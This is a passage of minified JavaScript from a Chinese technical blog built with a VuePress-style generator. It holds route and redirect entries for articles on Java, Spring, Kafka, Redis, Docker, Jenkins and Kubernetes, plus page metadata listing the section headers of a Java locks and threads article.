新特性总结.html",redirect:"/language/java/version/2/"},{name:"v-71786ef2",path:"/language/java/other/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-71786ef2").then(t)}},{path:"/language/java/other/1/index.html",redirect:"/language/java/other/1/"},{path:"/00.语言/01.JAVA/04.其他/1.打包exe程序.html",redirect:"/language/java/other/1/"},{name:"v-52ff49bd",path:"/language/java/other/2/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-52ff49bd").then(t)}},{path:"/language/java/other/2/index.html",redirect:"/language/java/other/2/"},{path:"/00.语言/01.JAVA/04.其他/2.java代码混淆之ProGuard.html",redirect:"/language/java/other/2/"},{name:"v-5ae2093a",path:"/language/java/other/3/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-5ae2093a").then(t)}},{path:"/language/java/other/3/index.html",redirect:"/language/java/other/3/"},{path:"/00.语言/01.JAVA/04.其他/3.JAVA 性能监控（jvisualvm）及测试（JMeter）.html",redirect:"/language/java/other/3/"},{name:"v-c1fddfba",path:"/language/java/other/5/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-c1fddfba").then(t)}},{path:"/language/java/other/5/index.html",redirect:"/language/java/other/5/"},{path:"/00.语言/01.JAVA/04.其他/5.jar启动脚本.html",redirect:"/language/java/other/5/"},{name:"v-585fb790",path:"/language/java/version/3/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-585fb790").then(t)}},{path:"/language/java/version/3/index.html",redirect:"/language/java/version/3/"},{path:"/00.语言/01.JAVA/03.版本/3.JAVA 10-17 新特性总结.html",redirect:"/language/java/version/3/"},{name:"v-747c7e31",path:"/language/cj/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-747c7e31").then(t)}},{path:"/language/cj/1/index.html",redirect:"/language/cj/1/"},{path:"/00.语言/02.仓颉/01.基础/1.仓颉.html",redirect:"/language/cj/1/"},{name:"v-1b2fbd05",path:"/language/java/other/4/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-1b2fbd05").then(t)}},{path:"/language/java/other/4/index.html",redirect:"/language/java/other/4/"},{path:"/00.语言/01.JAVA/04.其他/4.Alibaba Arthas.html",redirect:"/language/java/other/4/"},{name:"v-394fe5d6",path:"/language/mode/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-394fe5d6").then(t)}},{path:"/language/mode/1/index.html",redirect:"/language/mode/1/"},{path:"/00.语言/03.设计模式/1.设计模式.html",redirect:"/language/mode/1/"},{name:"v-ff2741c6",path:"/spring/spring/200/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-ff2741c6").then(t)}},{path:"/spring/spring/200/index.html",redirect:"/spring/spring/200/"},{path:"/01.框架/01.Spring/01.spring/200.核心内容拆解 IOC.html",redirect:"/spring/spring/200/"},{name:"v-5cc7fa15",path:"/spring/spring/201/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-5cc7fa15").then(t)}},{path:"/spring/spring/201/index.html",redirect:"/spring/spring/201/"},{path:"/01.框架/01.Spring/01.spring/201.核心内容拆解 AOP.html",redirect:"/spring/spring/201/"},{name:"v-6ae9c5a4",path:"/spring/spring/203/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-6ae9c5a4").then(t)}},{path:"/spring/spring/203/index.html",redirect:"/spring/spring/203/"},{path:"/01.框架/01.Spring/01.spring/203.核心内容拆解 三级缓存.html",redirect:"/spring/spring/203/"},{name:"v-7ee2cada",path:"/spring/spring/202/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-7ee2cada").then(t)}},{path:"/spring/spring/202/index.html",redirect:"/spring/spring/202/"},{path:"/01.框架/01.Spring/01.spring/202.核心内容拆解 事件通知.html",redirect:"/spring/spring/202/"},{name:"v-e7b7c32a",path:"/spring/spring/204/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-e7b7c32a").then(t)}},{path:"/spring/spring/204/index.html",redirect:"/spring/spring/204/"},{path:"/01.框架/01.Spring/01.spring/204.核心内容拆解 FactoryBean.html",redirect:"/spring/spring/204/"},{name:"v-9905be46",path:"/spring/spring/205/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-9905be46").then(t)}},{path:"/spring/spring/205/index.html",redirect:"/spring/spring/205/"},{path:"/01.框架/01.Spring/01.spring/205.注解替代Spring生命周期实现类.html",redirect:"/spring/spring/205/"},{name:"v-808a2772",path:"/spring/spring-mvc/200/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-808a2772").then(t)}},{path:"/spring/spring-mvc/200/index.html",redirect:"/spring/spring-mvc/200/"},{path:"/01.框架/01.Spring/02.spring mv/200.Spring MVC 之工作原理.html",redirect:"/spring/spring-mvc/200/"},{name:"v-3002ba14",path:"/spring/spring-boot/200/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-3002ba14").then(t)}},{path:"/spring/spring-boot/200/index.html",redirect:"/spring/spring-boot/200/"},{path:"/01.框架/01.Spring/03.spring boot/200.SpringBoot 之 Filter、Interceptor、Aspect.html",redirect:"/spring/spring-boot/200/"},{name:"v-02fdbe47",path:"/spring/spring-boot/203/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-02fdbe47").then(t)}},{path:"/spring/spring-boot/203/index.html",redirect:"/spring/spring-boot/203/"},{path:"/01.框架/01.Spring/03.spring boot/203.SpringBoot MyBatisPlus 实现多数据源.html",redirect:"/spring/spring-boot/203/"},{name:"v-23c6095a",path:"/spring/spring-boot/201/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-23c6095a").then(t)}},{path:"/spring/spring-boot/201/index.html",redirect:"/spring/spring-boot/201/"},{path:"/01.框架/01.Spring/03.spring boot/201.SpringBoot 之 Starter.html",redirect:"/spring/spring-boot/201/"},{name:"v-1527c6e0",path:"/spring/spring-boot/202/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-1527c6e0").then(t)}},{path:"/spring/spring-boot/202/index.html",redirect:"/spring/spring-boot/202/"},{path:"/01.框架/01.Spring/03.spring boot/202.SpringBoot 之 Stomp 使用和 vue 相配置.html",redirect:"/spring/spring-boot/202/"},{name:"v-07e31ee4",path:"/spring/spring-boot/204/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-07e31ee4").then(t)}},{path:"/spring/spring-boot/204/index.html",redirect:"/spring/spring-boot/204/"},{path:"/01.框架/01.Spring/03.spring boot/204.SpringBoot MyBatis 动态建表.html",redirect:"/spring/spring-boot/204/"},{name:"v-d16f8084",path:"/spring/spring-boot/206/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-d16f8084").then(t)}},{path:"/spring/spring-boot/206/index.html",redirect:"/spring/spring-boot/206/"},{path:"/01.框架/01.Spring/03.spring boot/206.Spring Boot 集成 FastDFS.html",redirect:"/spring/spring-boot/206/"},{name:"v-2c7a2efa",path:"/spring/spring-boot/205/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-2c7a2efa").then(t)}},{path:"/spring/spring-boot/205/index.html",redirect:"/spring/spring-boot/205/"},{path:"/01.框架/01.Spring/03.spring boot/205.Spring Boot 集成 Jasypt 3.0.3 配置文件加密.html",redirect:"/spring/spring-boot/205/"},{name:"v-6b4bcf80",path:"/spring/spring-boot/207/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-6b4bcf80").then(t)}},{path:"/spring/spring-boot/207/index.html",redirect:"/spring/spring-boot/207/"},{path:"/01.框架/01.Spring/03.spring boot/207.Spring Boot VUE前后端加解密.html",redirect:"/spring/spring-boot/207/"},{name:"v-1acf6d1d",path:"/spring/spring-cloud/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-1acf6d1d").then(t)}},{path:"/spring/spring-cloud/1/index.html",redirect:"/spring/spring-cloud/1/"},{path:"/01.框架/01.Spring/04.spring cloud/1.SpringCloud 之 Ribbon和Feign.html",redirect:"/spring/spring-cloud/1/"},{name:"v-63ccbaf9",path:"/spring/spring-cloud/2/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-63ccbaf9").then(t)}},{path:"/spring/spring-cloud/2/index.html",redirect:"/spring/spring-cloud/2/"},{path:"/01.框架/01.Spring/04.spring cloud/2.SpringCloud alibaba - Nacos.html",redirect:"/spring/spring-cloud/2/"},{name:"v-25d7f92e",path:"/mybatis/mybatis/300/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-25d7f92e").then(t)}},{path:"/mybatis/mybatis/300/index.html",redirect:"/mybatis/mybatis/300/"},{path:"/01.框架/02.Mybatis/31.mybatis/300.核心功能拆解 工作流程.html",redirect:"/mybatis/mybatis/300/"},{name:"v-7bea548f",path:"/mybatis/mybatis/301/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-7bea548f").then(t)}},{path:"/mybatis/mybatis/301/index.html",redirect:"/mybatis/mybatis/301/"},{path:"/01.框架/02.Mybatis/31.mybatis/301.核心功能拆解 Plugin插件功能实现.html",redirect:"/mybatis/mybatis/301/"},{name:"v-f97f0090",path:"/mybatis/mybatis/302/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-f97f0090").then(t)}},{path:"/mybatis/mybatis/302/index.html",redirect:"/mybatis/mybatis/302/"},{path:"/01.框架/02.Mybatis/31.mybatis/302.核心功能拆解 一二级缓存原理.html",redirect:"/mybatis/mybatis/302/"},{name:"v-0e7babe4",path:"/mybatis/mybatis/303/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-0e7babe4").then(t)}},{path:"/mybatis/mybatis/303/index.html",redirect:"/mybatis/mybatis/303/"},{path:"/01.框架/02.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存.html",redirect:"/mybatis/mybatis/303/"},{name:"v-5ad0f62c",path:"/maven/2300/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-5ad0f62c").then(t)}},{path:"/maven/2300/index.html",redirect:"/maven/2300/"},{path:"/01.框架/03.maven/2300.pom 文件介绍及 parent、properties 标签详解.html",redirect:"/maven/2300/"},{name:"v-4542ff7e",path:"/maven/2301/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-4542ff7e").then(t)}},{path:"/maven/2301/index.html",redirect:"/maven/2301/"},{path:"/01.框架/03.maven/2301.dependencies 标签详解.html",redirect:"/maven/2301/"},{name:"v-3ef166c4",path:"/maven/2302/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-3ef166c4").then(t)}},{path:"/maven/2302/index.html",redirect:"/maven/2302/"},{path:"/01.框架/03.maven/2302.使用 Nexus3.x 搭建私服.html",redirect:"/maven/2302/"},{name:"v-3d328794",path:"/kafka/1400/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-3d328794").then(t)}},{path:"/kafka/1400/index.html",redirect:"/kafka/1400/"},{path:"/02.中间件/01.kafka/1400.kafka-2.7.0 基本概念.html",redirect:"/kafka/1400/"},{name:"v-38452f23",path:"/kafka/1401/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-38452f23").then(t)}},{path:"/kafka/1401/index.html",redirect:"/kafka/1401/"},{path:"/02.中间件/01.kafka/1401.Kafka-2.7.0 搭建及参数解析.html",redirect:"/kafka/1401/"},{name:"v-2674598f",path:"/kafka/1402/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-2674598f").then(t)}},{path:"/kafka/1402/index.html",redirect:"/kafka/1402/"},{path:"/02.中间件/01.kafka/1402.kafka-2.7.0 spring boot 集成 kafka.html",redirect:"/kafka/1402/"},{name:"v-72fa657c",path:"/kafka/1404/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-72fa657c").then(t)}},{path:"/kafka/1404/index.html",redirect:"/kafka/1404/"},{path:"/02.中间件/01.kafka/1404.kafka-2.7.0 Kafka Streams 流处理.html",redirect:"/kafka/1404/"},{name:"v-4b5e3128",path:"/kafka/1403/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-4b5e3128").then(t)}},{path:"/kafka/1403/index.html",redirect:"/kafka/1403/"},{path:"/02.中间件/01.kafka/1403.kafka-2.7.0 kafka Connect.html",redirect:"/kafka/1403/"},{name:"v-dcb32594",path:"/redis/1602/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-dcb32594").then(t)}},{path:"/redis/1602/index.html",redirect:"/redis/1602/"},{path:"/02.中间件/03.redis/1602.Redis分布式锁介绍.html",redirect:"/redis/1602/"},{name:"v-21786cb6",path:"/redis/1600/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-21786cb6").then(t)}},{path:"/redis/1600/index.html",redirect:"/redis/1600/"},{path:"/02.中间件/03.redis/1600.Redis介绍.html",redirect:"/redis/1600/"},{name:"v-d6189198",path:"/redis/1601/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-d6189198").then(t)}},{path:"/redis/1601/index.html",redirect:"/redis/1601/"},{path:"/02.中间件/03.redis/1601.Redis命令介绍.html",redirect:"/redis/1601/"},{name:"v-082b0d2c",path:"/Redis/1603/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-082b0d2c").then(t)}},{path:"/Redis/1603/index.html",redirect:"/Redis/1603/"},{path:"/02.中间件/03.redis/1603.Redis事务介绍.html",redirect:"/Redis/1603/"},{name:"v-eca50964",path:"/Redis/1604/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-eca50964").then(t)}},{path:"/Redis/1604/index.html",redirect:"/Redis/1604/"},{path:"/02.中间件/03.redis/1604.Redis的key失效通知介绍.html",redirect:"/Redis/1604/"},{name:"v-5ff80878",path:"/Redis/1606/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-5ff80878").then(t)}},{path:"/Redis/1606/index.html",redirect:"/Redis/1606/"},{path:"/02.中间件/03.redis/1606.Redis记一次宕机排查.html",redirect:"/Redis/1606/"},{name:"v-5c71f4fa",path:"/Redis/1605/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-5c71f4fa").then(t)}},{path:"/Redis/1605/index.html",redirect:"/Redis/1605/"},{path:"/02.中间件/03.redis/1605.Redis配置文件解读.html",redirect:"/Redis/1605/"},{name:"v-146c1cb3",path:"/Redis/1608/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-146c1cb3").then(t)}},{path:"/Redis/1608/index.html",redirect:"/Redis/1608/"},{path:"/02.中间件/03.redis/1608.Redis高可用(二) 哨兵理论.html",redirect:"/Redis/1608/"},{name:"v-315575a6",path:"/Redis/1607/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-315575a6").then(t)}},{path:"/Redis/1607/index.html",redirect:"/Redis/1607/"},{path:"/02.中间件/03.redis/1607.Redis高可用(一) 主从理论.html",redirect:"/Redis/1607/"},{name:"v-727d91d9",path:"/Redis/1609/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-727d91d9").then(t)}},{path:"/Redis/1609/index.html",redirect:"/Redis/1609/"},{path:"/02.中间件/03.redis/1609.Redis高可用(三) 搭建.html",redirect:"/Redis/1609/"},{name:"v-44194b63",path:"/nginx/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-44194b63").then(t)}},{path:"/nginx/1/index.html",redirect:"/nginx/1/"},{path:"/02.中间件/04.nginx/1700.Nginx 基本概念及介绍.html",redirect:"/nginx/1/"},{name:"v-5b4e4ae2",path:"/es/1800/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-5b4e4ae2").then(t)}},{path:"/es/1800/index.html",redirect:"/es/1800/"},{path:"/02.中间件/05.Elasticsearch/1800.ES 7.8.0（一） 入门介绍.html",redirect:"/es/1800/"},{name:"v-e5da1462",path:"/es/1801/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-e5da1462").then(t)}},{path:"/es/1801/index.html",redirect:"/es/1801/"},{path:"/02.中间件/05.Elasticsearch/1801.ES 7.8.0（二） 读、写和写索引流程以及文档分析过程.html",redirect:"/es/1801/"},{name:"v-4fb47c6c",path:"/es/1802/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-4fb47c6c").then(t)}},{path:"/es/1802/index.html",redirect:"/es/1802/"},{path:"/02.中间件/05.Elasticsearch/1802.ES 7.8.0（三） 文档冲突.html",redirect:"/es/1802/"},{name:"v-1b92a67a",path:"/mysql/1300/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-1b92a67a").then(t)}},{path:"/mysql/1300/index.html",redirect:"/mysql/1300/"},{path:"/03.大数据/04.mysql/1300.MySQL 索引介绍.html",redirect:"/mysql/1300/"},{name:"v-a652ea48",path:"/mysql/1301/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-a652ea48").then(t)}},{path:"/mysql/1301/index.html",redirect:"/mysql/1301/"},{path:"/03.大数据/04.mysql/1301.MySQL 锁介绍.html",redirect:"/mysql/1301/"},{name:"v-8194159c",path:"/mongodb/1800/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-8194159c").then(t)}},{path:"/mongodb/1800/index.html",redirect:"/mongodb/1800/"},{path:"/03.大数据/05.mongodb/1800.mongodb.html",redirect:"/mongodb/1800/"},{name:"v-4993606a",path:"/mysql/1302/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-4993606a").then(t)}},{path:"/mysql/1302/index.html",redirect:"/mysql/1302/"},{path:"/03.大数据/04.mysql/1302.MySQL 索引优化工具 explain.html",redirect:"/mysql/1302/"},{name:"v-066dd738",path:"/linux/2300/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-066dd738").then(t)}},{path:"/linux/2300/index.html",redirect:"/linux/2300/"},{path:"/04.运维/2300.linux/2300.Linux 创建用户及权限操作.html",redirect:"/linux/2300/"},{name:"v-4fbe8f80",path:"/linux/2301/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-4fbe8f80").then(t)}},{path:"/linux/2301/index.html",redirect:"/linux/2301/"},{path:"/04.运维/2300.linux/2301.Linux 磁盘操作相关命令.html",redirect:"/linux/2301/"},{name:"v-008f5f06",path:"/linux/2302/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-008f5f06").then(t)}},{path:"/linux/2302/index.html",redirect:"/linux/2302/"},{path:"/04.运维/2300.linux/2302.Linux 文本数据处理工具awk命令.html",redirect:"/linux/2302/"},{name:"v-827e00c2",path:"/linux/2303/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-827e00c2").then(t)}},{path:"/linux/2303/index.html",redirect:"/linux/2303/"},{path:"/04.运维/2300.linux/2303.Linux 定时任务.html",redirect:"/linux/2303/"},{name:"v-775a7bcf",path:"/docker/400/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-775a7bcf").then(t)}},{path:"/docker/400/index.html",redirect:"/docker/400/"},{path:"/04.运维/40.Docker/400.Docker 概念、命令及Dockerfile介绍.html",redirect:"/docker/400/"},{name:"v-5108785a",path:"/linux/2305/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-5108785a").then(t)}},{path:"/linux/2305/index.html",redirect:"/linux/2305/"},{path:"/04.运维/2300.linux/2305.Linux 22端口对外攻击解决.html",redirect:"/linux/2305/"},{name:"v-52c117a4",path:"/linux/2304/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-52c117a4").then(t)}},{path:"/linux/2304/index.html",redirect:"/linux/2304/"},{path:"/04.运维/2300.linux/2304.Linux 命令总结.html",redirect:"/linux/2304/"},{name:"v-5e7029de",path:"/docker/401/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-5e7029de").then(t)}},{path:"/docker/401/index.html",redirect:"/docker/401/"},{path:"/04.运维/40.Docker/401.Docker-Compose 命令及基本使用.html",redirect:"/docker/401/"},{name:"v-d0de8634",path:"/docker/402/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-d0de8634").then(t)}},{path:"/docker/402/index.html",redirect:"/docker/402/"},{path:"/04.运维/40.Docker/402.Docker私有库的开发.html",redirect:"/docker/402/"},{name:"v-909b2404",path:"/jenkins/500/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-909b2404").then(t)}},{path:"/jenkins/500/index.html",redirect:"/jenkins/500/"},{path:"/04.运维/50.Jenkins/500.Jenkins(一) 持续集成及Jenkins介绍.html",redirect:"/jenkins/500/"},{name:"v-64e25eba",path:"/jenkins/501/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-64e25eba").then(t)}},{path:"/jenkins/501/index.html",redirect:"/jenkins/501/"},{path:"/04.运维/50.Jenkins/501.Jenkins(二) Jenkins安装和环境配置.html",redirect:"/jenkins/501/"},{name:"v-4e70a85e",path:"/jenkins/502/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-4e70a85e").then(t)}},{path:"/jenkins/502/index.html",redirect:"/jenkins/502/"},{path:"/04.运维/50.Jenkins/502.Jenkins(三) Jenkins用户管理及凭证.html",redirect:"/jenkins/502/"},{name:"v-7d0dc8ff",path:"/jenkins/504/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-7d0dc8ff").then(t)}},{path:"/jenkins/504/index.html",redirect:"/jenkins/504/"},{path:"/04.运维/50.Jenkins/504.Jenkins(五) Jenkins构建Maven项目.html",redirect:"/jenkins/504/"},{name:"v-2ae3d180",path:"/jenkins/503/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-2ae3d180").then(t)}},{path:"/jenkins/503/index.html",redirect:"/jenkins/503/"},{path:"/04.运维/50.Jenkins/503.Jenkins(四) Maven安装和配置.html",redirect:"/jenkins/503/"},{name:"v-2df2013e",path:"/jenkins/505/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-2df2013e").then(t)}},{path:"/jenkins/505/index.html",redirect:"/jenkins/505/"},{path:"/04.运维/50.Jenkins/505.Jenkins(六) Jenkins项目构建细节.html",redirect:"/jenkins/505/"},{name:"v-f2dce1b0",path:"/jenkins/506/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-f2dce1b0").then(t)}},{path:"/jenkins/506/index.html",redirect:"/jenkins/506/"},{path:"/04.运维/50.Jenkins/506.Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）.html",redirect:"/jenkins/506/"},{name:"v-966f9b00",path:"/jenkins/507/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-966f9b00").then(t)}},{path:"/jenkins/507/index.html",redirect:"/jenkins/507/"},{path:"/04.运维/50.Jenkins/507.Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）.html",redirect:"/jenkins/507/"},{name:"v-212cb943",path:"/kubernetes/600/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-212cb943").then(t)}},{path:"/kubernetes/600/index.html",redirect:"/kubernetes/600/"},{path:"/04.运维/60.Kubernetes/600.kubernetes(一) 概念及介绍.html",redirect:"/kubernetes/600/"},{name:"v-80701660",path:"/kubernetes/601/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-80701660").then(t)}},{path:"/kubernetes/601/index.html",redirect:"/kubernetes/601/"},{path:"/04.运维/60.Kubernetes/601.kubernetes(二) 集群环境搭建.html",redirect:"/kubernetes/601/"},{name:"v-1cf8c197",path:"/kubernetes/602/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-1cf8c197").then(t)}},{path:"/kubernetes/602/index.html",redirect:"/kubernetes/602/"},{path:"/04.运维/60.Kubernetes/602.kubernetes(三) 资源管理.html",redirect:"/kubernetes/602/"},{name:"v-be3913a8",path:"/kubernetes/603/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-be3913a8").then(t)}},{path:"/kubernetes/603/index.html",redirect:"/kubernetes/603/"},{path:"/04.运维/60.Kubernetes/603.kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍.html",redirect:"/kubernetes/603/"},{name:"v-589af7a8",path:"/kubernetes/604/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-589af7a8").then(t)}},{path:"/kubernetes/604/index.html",redirect:"/kubernetes/604/"},{path:"/04.运维/60.Kubernetes/604.kubernetes(五) Pod 介绍及配置.html",redirect:"/kubernetes/604/"},{name:"v-c4504aa6",path:"/kubernetes/605/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-c4504aa6").then(t)}},{path:"/kubernetes/605/index.html",redirect:"/kubernetes/605/"},{path:"/04.运维/60.Kubernetes/605.kubernetes(六) Pod 生命周期.html",redirect:"/kubernetes/605/"},{name:"v-1bd8b602",path:"/kubernetes/606/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-1bd8b602").then(t)}},{path:"/kubernetes/606/index.html",redirect:"/kubernetes/606/"},{path:"/04.运维/60.Kubernetes/606.kubernetes(七) Pod 调度.html",redirect:"/kubernetes/606/"},{name:"v-4af5aed9",path:"/kubernetes/607/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-4af5aed9").then(t)}},{path:"/kubernetes/607/index.html",redirect:"/kubernetes/607/"},{path:"/04.运维/60.Kubernetes/607.kubernetes(八) Pod 控制器详解.html",redirect:"/kubernetes/607/"},{name:"v-145b2bd8",path:"/kubernetes/609/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-145b2bd8").then(t)}},{path:"/kubernetes/609/index.html",redirect:"/kubernetes/609/"},{path:"/04.运维/60.Kubernetes/609.kubernetes(十) Ingress介绍及使用.html",redirect:"/kubernetes/609/"},{name:"v-3701b2bc",path:"/kubernetes/608/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-3701b2bc").then(t)}},{path:"/kubernetes/608/index.html",redirect:"/kubernetes/608/"},{path:"/04.运维/60.Kubernetes/608.kubernetes(九) Service介绍、类型及使用.html",redirect:"/kubernetes/608/"},{name:"v-2715e687",path:"/kubernetes/610/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-2715e687").then(t)}},{path:"/kubernetes/610/index.html",redirect:"/kubernetes/610/"},{path:"/04.运维/60.Kubernetes/610.kubernetes(十一) 数据存储（挂载卷管理）.html",redirect:"/kubernetes/610/"},{name:"v-3a5a1361",path:"/kubernetes/611/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-3a5a1361").then(t)}},{path:"/kubernetes/611/index.html",redirect:"/kubernetes/611/"},{path:"/04.运维/60.Kubernetes/611.kubernetes(十二) 安全认证.html",redirect:"/kubernetes/611/"},{name:"v-40ab9df5",path:"/kubernetes/612/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-40ab9df5").then(t)}},{path:"/kubernetes/612/index.html",redirect:"/kubernetes/612/"},{path:"/04.运维/60.Kubernetes/612.kubernetes(十三) DashBoard.html",redirect:"/kubernetes/612/"},{name:"v-59de6d20",path:"/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-59de6d20").then(t)}},{path:"/index.html",redirect:"/"},{path:"*",component:Hs}],Ws={title:"技术博客",description:"人民万岁",base:"/",headTags:[["link",{rel:"icon",href:"/favicon.ico"}],["meta",{name:"viewport",content:"width=device-width,initial-scale=1,user-scalable=no"}]],pages:[{title:"JAVA 锁 及 线程",frontmatter:{title:"JAVA 锁 及 线程",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/base/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/01.%E5%9F%BA%E7%A1%80/1.JAVA%20%E9%94%81%20%E5%8F%8A%20%E7%BA%BF%E7%A8%8B.html",relativePath:"00.语言/01.JAVA/01.基础/1.JAVA 锁 及 线程.md",key:"v-2dd0fd66",path:"/language/java/base/1/",headers:[{level:2,title:"一、基础感念",slug:"一、基础感念",normalizedTitle:"一、基础感念",charIndex:2},{level:3,title:"同步 和 异步",slug:"同步-和-异步",normalizedTitle:"同步 和 异步",charIndex:62},{level:3,title:"并发 和 并行",slug:"并发-和-并行",normalizedTitle:"并发 和 并行",charIndex:192},{level:3,title:"临界区",slug:"临界区",normalizedTitle:"临界区",charIndex:315},{level:3,title:"阻塞 和 非阻塞",slug:"阻塞-和-非阻塞",normalizedTitle:"阻塞 和 非阻塞",charIndex:449},{level:3,title:"死锁 饥饿 活锁",slug:"死锁-饥饿-活锁",normalizedTitle:"死锁 饥饿 活锁",charIndex:535},{level:3,title:"并发的级别",slug:"并发的级别",normalizedTitle:"并发的级别",charIndex:772},{level:3,title:"无饥饿",slug:"无饥饿",normalizedTitle:"无饥饿",charIndex:840},{level:3,title:"无障碍",slug:"无障碍",normalizedTitle:"无障碍",charIndex:844},{level:3,title:"无锁",slug:"无锁",normalizedTitle:"无锁",charIndex:848},{level:3,title:"无等待",slug:"无等待",normalizedTitle:"无等待",charIndex:851},{level:3,title:"原子性",slug:"原子性",normalizedTitle:"原子性",charIndex:2200},{level:3,title:"可见性",slug:"可见性",normalizedTitle:"可见性",charIndex:2261},{level:3,title:"有序性",slug:"有序性",normalizedTitle:"有序性",charIndex:2307},{level:2,title:"二、线程",slug:"二、线程",normalizedTitle:"二、线程",charIndex:2382},{level:3,title:"状态",slug:"状态",normalizedTitle:"状态",charIndex:2391},{level:3,title:"suspend()暂停 resume()继续",slug:"suspend-暂停-resume-继续",normalizedTitle:"suspend () 暂停 resume () 继续",charIndex:2532},{level:3,title:"stop() 强行终止线程",slug:"stop-强行终止线程",normalizedTitle:"stop () 强行终止线程",charIndex:2664},{level:3,title:"interrupt() isInterrupted()  interrupted() 中断线程",slug:"interrupt-isinterrupted-interrupted-中断线程",normalizedTitle:"interrupt () isinterrupted ()  interrupted () 中断线程",charIndex:null},{level:3,title:"wait() notify() notifyAll() 等待和唤醒",slug:"wait-notify-notifyall-等待和唤醒",normalizedTitle:"wait () notify () notifyall () 等待和唤醒",charIndex:4423},{level:3,title:"join() 等待线程结束，yield() 谦让",slug:"join-等待线程结束-yield-谦让",normalizedTitle:"join () 等待线程结束，yield () 